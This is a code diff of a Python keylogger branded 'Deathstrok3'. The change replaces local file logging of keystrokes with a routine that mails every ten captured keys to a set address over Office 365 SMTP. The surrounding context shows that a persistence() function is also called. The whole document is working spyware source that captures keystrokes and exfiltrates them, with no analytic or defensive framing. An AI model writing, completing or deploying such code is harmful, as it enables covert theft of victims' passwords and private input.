@@ -1,12 +1,16 @@
 #Import Key and Listener module
+import shutil
 import subprocess
 import sys
-import shutil
 
 subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
 
-from pynput.keyboard import Key, Listener
+import getpass
+import smtplib
+import ssl
+import time
 
+from pynput.keyboard import Key, Listener
 
 print('''________                 __  .__              __                 __    
 \______ \   ____ _____ _/  |_|  |__   _______/  |________  ____ |  | __\_____  \ 
@@ -16,36 +20,63 @@ print('''________                 __  .__              __                 __
         \/     \/     \/          \/     \/                          \/       \/''')
 
 count = 0
-keys = []
+subject = "insert email header"
+full_log = '\n' #without it log will be sent in the header of the email. Body wil be empty 
+sender_email = 'insert your email'
+receiver_email = 'insert your email'
+email = input('Enter email:')
+password = getpass.getpass(prompt='Welcome Slade:', stream=None)
+port = 587
+context = ssl.create_default_context()
+smtp_server = "smtp.office365.com"
+
+#Time Interval
+def timed_log():
+    if len(full_log) >= 10:
+        send_email()
+        time.sleep(10) #time in seconds
+
+#Email
+def send_email():
+    global full_log
+    global message 
+    if len(full_log) >= 10:
+        try: 
+            server = smtplib.SMTP(smtp_server, port)
+            server.ehlo() #optional
+            server.starttls(context=context)
+            server.ehlo() #optional
+            server.login(sender_email, password)
+            print(' Successful login! ')
+            server.sendmail(sender_email, receiver_email,full_log)
+            print(' Email sent. ')
+            server.quit()
+        except Exception as e:
+            print(e)
+
 #Without this Error will coccur if we try to call a boolean Value as a function
 my_bool = False
 
 # print the key strokes to the log file
 #when key is pressed
 def on_press(key):
-  global keys, count
-
-  keys.append(key)
+  global keys, count, full_log
+  full_log += str(key)
   count += 1
-  #Sanity check for key recording
-  #Key placed in string
-  print("{0} pressed".format(key))
 
-#Every 20 keys typed by user txt file is updated
+#Every 10 keys typed by user txt file is updated
 #Can be any number
-  if count >= 20:
+  if count >= 10:
     count = 0
-    write_file(keys)
     #Resets keys
-    keys = []
+    print('Deathstrok3 activated!')
+    timed_log()
+    print(full_log)
     
-    
-#write to a file
-#text file can be named how you see fit
-def write_file(key):
-  with open("key_log.txt", "w") as f:
-    for key in keys:
-      f.write(str(key))
+    if count == 0:
+        full_log = '\n'
+
+
 
 #When  key is released
 #Breaks loop if we hit the escape key
@@ -85,4 +116,4 @@ persistence()
     
 #Will continously loop through until broken
 with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join() 
+    listener.join()
